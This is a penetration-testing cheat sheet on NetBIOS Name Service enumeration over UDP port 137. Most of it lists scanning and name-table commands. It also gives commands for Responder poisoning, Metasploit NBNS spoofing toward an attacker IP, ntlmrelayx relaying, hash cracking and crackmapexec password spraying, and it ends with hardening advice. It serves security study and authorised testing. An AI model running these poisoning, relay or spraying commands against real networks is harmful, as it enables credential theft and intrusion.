# NETBIOS NAME SERVICE ENUMERATION (Port 137/UDP)

## SERVICE OVERVIEW
```
NetBIOS Name Service (NBNS) - Windows name resolution
- Port: 137/UDP
- Resolves NetBIOS names to IP addresses
- Precursor to DNS in Windows networks
- Reveals hostnames, domain names, user accounts
- Broadcasts names on local network
```

## BANNER GRABBING & ENUMERATION
```bash
# Nmap NetBIOS enumeration
nmap -sU -p137 <IP>                             # UDP scan port 137
nmap -sU -p137 --script nbstat <IP>             # NetBIOS name and MAC
nmap -sU -p137 --script nbtstat.nse <IP>        # Alternative script

# NBTscan (fast NetBIOS scanner)
nbtscan <IP>                                    # Single host
nbtscan 192.168.1.0/24                          # Scan subnet
nbtscan -r 192.168.1.0/24                       # Reverse lookup
nbtscan -v <IP>                                 # Verbose output

# nmblookup (Samba tool)
nmblookup -A <IP>                               # NetBIOS name query
nmblookup <hostname>                            # Resolve hostname to IP
```

## NETBIOS NAME TABLE
```bash
# Query NetBIOS name table
nmap -sU -p137 --script nbstat <IP>

# Name types revealed:
# <00> Workstation/Computer name
# <03> Messenger service
# <20> File Server service
# <1B> Domain Master Browser
# <1D> Master Browser
# <1E> Browser Service Elections
# <00> (GROUP) Domain name
# <1C> (GROUP) Domain Controllers

# Example output interpretation:
COMPUTERNAME  <00>  UNIQUE      # Computer name
COMPUTERNAME  <20>  UNIQUE      # File sharing enabled
WORKGROUP     <00>  GROUP       # Workgroup/Domain name
WORKGROUP     <1E>  GROUP       # Browser elections
```

## NMAP SCRIPTS
```bash
# Comprehensive NetBIOS scan
nmap -sU -sS -p U:137,T:139 --script nbstat,smb-os-discovery <IP>

# Get NetBIOS names
nmap -sU -p137 --script nbstat.nse <IP>

# Broadcast NetBIOS name query
nmap -sU -p137 --script broadcast-netbios-master-browser

# NetBIOS information gathering
nmap -sU --script nbns-interfaces -p137 <IP>
```

## ENUMERATE NETBIOS NAMES
```bash
# nmblookup - enumerate names
nmblookup -A <IP>                               # Query all names
nmblookup -S <hostname>                         # Query specific name

# Get NetBIOS name and workgroup
nbtscan -v <IP> | grep -E "Name|Workgroup"

# Reverse lookup
nmblookup -A <IP> | grep '<00>' | grep -v GROUP  # Get computer name
```

## NETBIOS SUFFIXES EXPLAINED
```
Suffix  Type    Meaning
------  ------  -------
<00>    U       Workstation Service (computer name)
<01>    U       Messenger Service
<03>    U       Messenger Service
<06>    U       RAS Server Service
<1B>    U       Domain Master Browser
<1D>    U       Master Browser
<1E>    G       Browser Service Elections
<1F>    U       NetDDE Service
<20>    U       File Server Service (SMB)
<21>    U       RAS Client Service
<22>    U       Exchange Interchange
<23>    U       Exchange Store
<24>    U       Exchange Directory
<2B>    U       Lotus Notes Server
<2F>    G       Lotus Notes
<30>    U       Modem Sharing Server
<31>    U       Modem Sharing Client
<33>    G       Lotus Notes
<43>    U       SMS Client Remote Control
<44>    U       SMS Admin Remote Control
<45>    U       SMS Client Remote Chat
<46>    U       SMS Client Remote Transfer
<4C>    U       DEC Pathworks TCP/IP
<52>    U       DEC Pathworks TCP/IP
<87>    U       Microsoft Exchange MTA
<6A>    U       Microsoft Exchange IMC
<BE>    U       Network Monitor Agent
<BF>    U       Network Monitor Apps

U = Unique name (single host)
G = Group name (multiple hosts)
```

## NETBIOS BROADCAST QUERIES
```bash
# Send broadcast query on local network
nmap --script broadcast-netbios-master-browser  # Find master browser

# Responder (capture NetBIOS responses)
responder -I eth0 -A                            # Analyze mode (passive)
responder -I eth0                               # Active poisoning mode
```

## WINDOWS NETBIOS COMMANDS
```bash
# If you have Windows access
nbtstat -A <IP>                                 # Remote name table
nbtstat -a <hostname>                           # Query by name
nbtstat -n                                      # Local NetBIOS names
nbtstat -c                                      # NetBIOS name cache
nbtstat -r                                      # Names resolved by broadcast/WINS
nbtstat -s                                      # NetBIOS sessions

# Clear NetBIOS cache
nbtstat -R                                      # Purge and reload cache
nbtstat -RR                                     # Release and refresh names
```

## IDENTIFY DOMAIN CONTROLLERS
```bash
# Find domain controllers via NetBIOS
nmblookup -A <IP> | grep '<1B>'                 # Domain Master Browser
nmblookup -A <IP> | grep '<1C>'                 # Domain Controllers

# Nmap script
nmap -sU -p137 --script nbstat <IP> | grep -E "1B|1C"
```

## NETBIOS NAME POISONING
```bash
# Responder (LLMNR/NBT-NS poisoning)
responder -I eth0 -wrf                          # Enable WPAD, responder, fingerprint
responder -I eth0 -wrfP                         # Force proxy auth

# Capture hashes
responder -I eth0 -wrf
# Wait for authentication attempts
# Crack captured hashes with hashcat/john

# Manual NetBIOS poisoning
# Use Metasploit or custom scripts to respond to NBNS queries
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/netbios/nbname            # NetBIOS name scanner
use auxiliary/scanner/netbios/nbname_probe      # NetBIOS probe
use auxiliary/spoof/nbns/nbns_response          # NetBIOS name poisoning

# Scanner
set RHOSTS <IP>
set THREADS 10
run

# Spoofing (MitM attacks)
use auxiliary/spoof/nbns/nbns_response
set INTERFACE eth0
set SPOOFIP <attacker_IP>
run
```

## ENUMERATE WITH ENUM4LINUX
```bash
# enum4linux includes NetBIOS enumeration
enum4linux -n <IP>                              # NetBIOS names
enum4linux -a <IP>                              # Full enumeration (includes NetBIOS)
```

## COMMON MISCONFIGURATIONS
```
☐ NetBIOS enabled on internet-facing systems
☐ NetBIOS-NS not disabled when not needed
☐ No network segmentation (broadcast domain too large)
☐ LLMNR/NBT-NS poisoning possible
☐ NetBIOS revealing sensitive hostnames
☐ Domain controller identifiable via NetBIOS
☐ Workgroup/domain names exposed
```

## QUICK WIN CHECKLIST
```
☐ Scan for port 137/UDP (NetBIOS-NS)
☐ Enumerate NetBIOS names with nbtscan
☐ Identify computer names (<00> suffix)
☐ Identify file servers (<20> suffix)
☐ Find domain controllers (<1B>, <1C> suffix)
☐ Identify workgroup/domain name
☐ Check for NetBIOS name poisoning opportunities
☐ Use Responder for LLMNR/NBT-NS poisoning
☐ Correlate with SMB (139/445) enumeration
```

## ONE-LINER ENUMERATION
```bash
# Quick NetBIOS enumeration
nmap -sU -p137 --script nbstat <IP> && nbtscan <IP>

# Subnet scan
nbtscan -r 192.168.1.0/24 | tee netbios_scan.txt

# With nmblookup
nmblookup -A <IP> | tee netbios_names.txt
```

## ADVANCED TECHNIQUES
```bash
# NetBIOS name spoofing (MitM)
# Respond to NetBIOS queries with malicious IP

# Responder with relay
responder -I eth0 -wrf
# In another terminal:
ntlmrelayx.py -tf targets.txt -smb2support

# NetBIOS cache poisoning
# Inject fake NetBIOS name-to-IP mappings
```

## TOOLS
```bash
# nbtscan (fast NetBIOS scanner)
apt-get install nbtscan
nbtscan -r <IP_range>

# nmblookup (Samba)
apt-get install samba-common-bin
nmblookup -A <IP>

# Nmap
nmap -sU -p137 --script nbstat <IP>

# Responder (poisoning)
git clone https://github.com/lgandx/Responder.git
python Responder.py -I eth0 -wrf

# Windows nbtstat
nbtstat -A <IP>                                 # Windows built-in
```

## SECURITY IMPLICATIONS
```
RISKS:
- Hostname/domain disclosure (reconnaissance)
- Domain controller identification
- NetBIOS name poisoning (credential theft)
- LLMNR/NBT-NS relay attacks
- Man-in-the-Middle attacks
- Network topology mapping
- Workstation/server identification

RECOMMENDATIONS:
- Disable NetBIOS-NS if not required
- Disable LLMNR via Group Policy
- Use DNS instead of NetBIOS for name resolution
- Enable SMB signing to prevent relay attacks
- Implement network segmentation
- Monitor for NetBIOS poisoning attacks
- Use firewall rules to block external NetBIOS
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Combine with SMB enumeration (port 139/445)
nmap -sU -sS -p U:137,T:139,T:445 --script nbstat,smb-os-discovery <IP>

# Use NetBIOS names for targeted attacks
# 1. Enumerate via NetBIOS
# 2. Identify file servers (<20>)
# 3. Attack SMB service (port 445)
# 4. Use Responder for credential capture

# Chain attack
nbtscan <subnet> | grep '<20>' | awk '{print $1}' > file_servers.txt
crackmapexec smb file_servers.txt -u users.txt -p passwords.txt
```
